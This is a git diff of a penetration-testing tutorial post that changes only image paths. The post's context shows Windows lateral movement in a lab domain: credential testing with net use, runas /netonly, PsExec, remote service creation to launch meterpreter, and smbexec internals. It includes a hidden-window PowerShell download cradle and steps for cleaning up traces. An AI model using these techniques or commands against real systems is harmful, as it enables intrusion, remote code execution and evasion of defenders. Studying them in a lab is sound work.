@@ -31,22 +31,22 @@ There's a few ways you can test credentials against a machine from Windows, but 
 ### SMB Login
 An easy way to test credentials is to try to initiate an SMB connection to the machine. This is essentially what Metasploit's module does. In Windows, you can utilize the `net use` command with credentials to establish an SMB connection with a host:
 
-![net use with credentials](/content/images/2016/04/net_use_success.png)
+![net use with credentials](/images/2016/04/net_use_success.png)
 
 We can see it completes successfully, so the credentials are good. To see if we are an admin, let's try to view one of the admin shares ("C$", or "ADMIN$"):
 
-![listing contents of an Admin share](/content/images/2016/04/dir_c_success.png)
+![listing contents of an Admin share](/images/2016/04/dir_c_success.png)
 
 If we weren't an admin, we'd see an access denied:
-![access denied for Admin share](/content/images/2016/04/dir_c_failure.png)
+![access denied for Admin share](/images/2016/04/dir_c_failure.png)
 
 We can see which connections we have open by issuing a `net use` command:
 
-![net use list](/content/images/2016/04/net_use_list.png)
+![net use list](/images/2016/04/net_use_list.png)
 
 Now one of the problems with this technique is we have established connections with the Windows hosts that can be detected. If an administrator on ordws01 ran a `net session` command, he or she would see a connection open from our attacking box:
 
-![net session from ordws01](/content/images/2016/04/net_session_list.png)
+![net session from ordws01](/images/2016/04/net_session_list.png)
 
 From our attack box, we can terminate all sessions with `net use /delete *`
 
@@ -56,15 +56,15 @@ The other problem is that we can't use all the `net` commands and other Windows 
 The Windows `runas` command let's us execute commands in the context of another user. When used with the '/netonly' option, we can authenticate as a domain user, *even though we're not on a domain joined machine*.
 
 We can launch an interactive command prompt by running "cmd.exe" with `runas`. The beauty of this technique is that our LogonId changes, and we can actually start using Kerberos auth on the domain. Note how the `whoami` output is the same but our LogonId changes in the new command prompt after doing a `runas`:
-![runas with klist](/content/images/2016/04/runas_klist.jpg)
+![runas with klist](/images/2016/04/runas_klist.jpg)
 
 In this new command prompt, we don't need to run the `net use` command to open connections with specified credentials. We can just use normal commands the Windows will use our LogonId with Kerberos authentication:
 
-![net view with kerberos](/content/images/2016/04/net_view_kerb.png)
+![net view with kerberos](/images/2016/04/net_view_kerb.png)
 
 We can verify that it used Kerberos authentication by running `klist` again and noting the principal name for the TGT, "jarrieta@cscou.lab":
 
-![klist TGT principal](/content/images/2016/04/klist_tgt.jpg)
+![klist TGT principal](/images/2016/04/klist_tgt.jpg)
 
 From this command prompt we are essentially "on the domain" and can start running native Windows commands with the privileges of jarrieta.
 
@@ -77,7 +77,7 @@ From the TechNet article:
 
 It's a standalone binary that's included in the [Sysinternals suite](https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx). You can pass credentials to it and remotely execute commands or drop into an interactive command prompt:
 
-![psexec shell](/content/images/2016/04/psexec_shell.jpg)
+![psexec shell](/images/2016/04/psexec_shell.jpg)
 
 If you run it from the "runas" command prompt which has a Kerberos TGT, you don't even need to specify credentials.
 
@@ -89,7 +89,7 @@ Starting PSEXESVC service on ordws01.cscou.lab...
 
 This might clue you in a little bit as to how PsExec actually operates. What it's doing is remotely starting a service on the target machine (called "PSEXECSVC"). In fact, if we go on the target machine and view services while the command prompt is open, we can see it:
 
-![PSEXESVC Details](/content/images/2016/04/psexec_svc.png)
+![PSEXESVC Details](/images/2016/04/psexec_svc.png)
 
 The service starts the binary `C:\Windows\PSEXECSVC.exe`. That directory is actually the ADMIN$ share over SMB. So PsExec performs a few steps to get you a shell:
  
@@ -105,23 +105,23 @@ First let's assume we have a payload executable we generated with msfvenom and o
 
 **Copy the binary**. From our "jarrieta" command prompt, simply copy the binary to the ADMIN$. Really though, it could be copied and hidden anywhere on the filesystem.
 
-![Copy binary to admin share](/content/images/2016/04/copy_binary_admin.png)
+![Copy binary to admin share](/images/2016/04/copy_binary_admin.png)
 
 **Create a service**. The Windows `sc` command is used to query, create, delete, etc Windows services and can be used remotely. Read more about it [here](https://technet.microsoft.com/en-us/library/bb490995.aspx). From our command prompt, we'll remotely create a service called "meterpreter" that points to our uploaded binary:
 
-![Create a remote service](/content/images/2016/04/sc_create.png)
+![Create a remote service](/images/2016/04/sc_create.png)
 
 **Start the service**. The last step is to start the service and execute the binary. *Note:* when the service starts it will "time-out" and generate an error. That's because our meterpreter binary isn't an actual service binary and won't return the expected response code. That's fine because we just need it to execute once to fire:
 
-![Start the service](/content/images/2016/04/sc_start_error.png)
+![Start the service](/images/2016/04/sc_start_error.png)
 
 If we look at our Metasploit listener, we'll see the session has been opened:
 
-![Meterpreter session open](/content/images/2016/04/meterpreter_session_service.png)
+![Meterpreter session open](/images/2016/04/meterpreter_session_service.png)
 
 **Cleanup our mess**. After getting the meterpreter session, I'd migrate out of the met8888.exe process and into a more permanent one. Then we need to delete the binary and stop/delete the remote service:
 
-![Clean up the service](/content/images/2016/04/sc_delete.png)
+![Clean up the service](/images/2016/04/sc_delete.png)
 
 One thing an astute reader might have noticed is that when we ran the normal PsExec binary and executed `whoami` in the shell, we were running as "cscou\jarrieta". But in meterpreter running `getuid` shows us as "NT AUTHORITY\SYSTEM". Why the sudden privilege escalation?
 
@@ -130,11 +130,11 @@ It has to do with how services are created and started. By default, services are
 ## SMBExec
 One of the Impacket tools I used last past to get a semi-interactive shell is "smbexec.py". This makes use of a really clever technique to execute commands and get output through SMB without needing to drop a binary on the system. Let's see what happens when smbexec runs by looking at it from the target's side. Obviously we could look at the source code, but this is more fun. As a reminder, let's see what smbexec looks like when it's fired up:
 
-![smbexec](/content/images/2016/04/smbexec_prompt.png)
+![smbexec](/images/2016/04/smbexec_prompt.png)
 
 So we know it creates a service "BTOBTO". But that service isn't present on the target machine when we do an `sc query`. The system logs reveal a clue to what happened:
 
-![service log](/content/images/2016/04/smbexec_service.png)
+![service log](/images/2016/04/smbexec_service.png)
 
 The Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe). It echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it. Back on Kali, the Python script then pulls the output file via SMB and displays the contents in our "pseudo-shell". For every command we type into our "shell", a new service is created and the process is repeated. This is why it doesn't need to drop a binary, it just executes each desired command as a new service. Definitely more stealthy, but as we saw, an event log is created for every command executed. Still a very clever way to get a non-interactive "shell"!
 
@@ -149,15 +149,15 @@ powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRe
 
 From our Windows attack box, we create a remote service ("metpsh") and set the binPath to execute cmd.exe with our payload:
 
-![sc create psh](/content/images/2016/04/sc_psh_create.png)
+![sc create psh](/images/2016/04/sc_psh_create.png)
 
 And then start it:
 
-![sc start psh](/content/images/2016/04/sc_psh_start.png)
+![sc start psh](/images/2016/04/sc_psh_start.png)
 
 It errors out because our service doesn't respond, but if we look at our Metasploit listener we see that the callback was made and the payload executed:
 
-![metasploit psh meterpreter](/content/images/2016/04/meterpreter_psh_exec.png)
+![metasploit psh meterpreter](/images/2016/04/meterpreter_psh_exec.png)
 
 And we just launched a meterpreter payload remotely through a Windows service without dropping a binary.
 
